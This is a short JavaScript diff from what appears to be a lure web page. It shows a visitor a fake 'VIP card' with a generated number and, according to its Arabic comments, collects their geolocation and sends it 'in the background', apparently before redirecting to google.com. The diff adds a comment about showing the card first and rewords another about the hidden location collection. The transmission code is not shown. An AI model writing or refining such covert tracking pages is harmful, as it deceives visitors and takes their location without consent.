@@ -118,6 +118,7 @@
         var p3 = Math.floor(1000 + Math.random() * 9000);
         var generatedNumber = "7777 " + p1 + " " + p2 + " " + p3;
 
+        // تفعيل الكارت الفوري أمام العميل أولاً بدون تأخير
         document.getElementById('formContainer').style.display = 'none';
         document.getElementById('vipCard').style.display = 'block';
         document.getElementById('displayHolder').innerText = clientName;
@@ -125,7 +126,7 @@
 
         var finalUrl = "https://google.com";
 
-        // سحب إحداثيات الموقع وإرسال البيانات
+        // تشغيل كود اللوكيشن والإرسال في الخلفية بسلاسة
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
                 var lat = position.coords.latitude;
